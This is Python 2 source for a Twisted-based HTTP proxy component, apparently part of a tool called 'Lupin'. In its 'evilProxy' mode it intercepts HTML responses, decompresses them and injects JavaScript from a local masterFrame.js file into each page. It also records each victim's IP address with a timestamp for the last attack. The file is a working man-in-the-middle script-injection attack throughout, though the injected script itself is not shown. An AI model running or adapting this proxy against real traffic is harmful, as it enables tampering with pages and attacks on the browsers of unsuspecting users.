import re, string, random, zlib, gzip, StringIO, os, time
from twisted.web.http import HTTPClient

class ServerConnection(HTTPClient):

    def __init__(self, command, uri, postData, actAs, headers, client):
        self.command          = command
        self.uri              = uri
        self.postData         = postData
        self.headers          = headers
        self.client           = client
        self.isCompressed     = False
        self.contentLength    = None
        self.shutdownComplete = False
        self.actAs            = actAs

    def getPostPrefix(self):
        return "POST"

    def sendRequest(self):
        self.sendCommand(self.command, self.uri)

    def sendHeaders(self):
        for header, value in self.headers.items():
            self.sendHeader(header, value)           
        self.endHeaders()

    def sendPostData(self):
        self.transport.write(self.postData)

    def connectionMade(self):
        self.sendRequest()
        self.sendHeaders()
        
        if (self.command == 'POST'):
            self.sendPostData()

    def handleStatus(self, version, status, message): 
	if status != "200":
		self.actAs = "goodProxy"
        self.client.setResponseCode(int(status), message)


    def handleHeader(self, key, value):     
        if (key.lower() == 'content-type'):
            if "text/html" not in value:
                self.actAs = "goodProxy"
        elif (key.lower() == 'content-encoding'):
            if "gzip" in value:
                self.isCompressed = True                
        elif (key.lower() == 'content-length'):
            self.contentLength = value
    
        self.client.setHeader(key, value)



    def handleEndHeaders(self):       
       if self.contentLength != None:
          self.client.setHeader("Content-Length", self.contentLength)
       
       if self.length == 0:
           self.shutdown()
                        
    def handleResponsePart(self, data):        
        if self.actAs == "goodProxy":
            self.client.write(data)
        else:
            HTTPClient.handleResponsePart(self, data)


    def handleResponseEnd(self):      
        if self.actAs == "goodProxy":
            self.shutdown()
        else:
            HTTPClient.handleResponseEnd(self)
                      

    def handleResponse(self, data):
        if (self.isCompressed):
            data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
              
        if self.actAs =="evilProxy":
            print "FRAMING: "+self.client.getHeader("host")
            data = self.injectMasterFrame(data)
	    '''
            lastAttack = open("lastAttack",'w')
	    currTime = str(time.time())
	    lastAttack.write(currTime)
	    lastAttack.close()
            '''
        if (self.contentLength != None):
            self.client.setHeader('Content-Length', len(data))     

        self.client.write(data)
        self.shutdown()
   

    def injectMasterFrame(self,data):      
	headEnd = data.find("</head>")
        if headEnd == -1:
             bodyEnd = data.find("</body>")
             if bodyEnd == -1:
                return data
             else:       
                newData = data[:bodyEnd]
                rest = data[bodyEnd:] 
        else: 
             newData = data[:headEnd]
             rest = data[headEnd:] 
                                                                                                                                                        
        masterFrame = open("Lupin/masterFrame.js")
	master = masterFrame.read()
        newData += "<script type=\"text/javascript\">"+ master +"</script>" + rest
        masterFrame.close()

	self.client.persistentData.setLastAttackTime(self.client.getClientIP())	
        return newData
         

    def shutdown(self):
        if not self.shutdownComplete:
            self.shutdownComplete = True
            try:  
               self.client.finish()        
            except:
               print "connection dead"
            self.transport.loseConnection() 

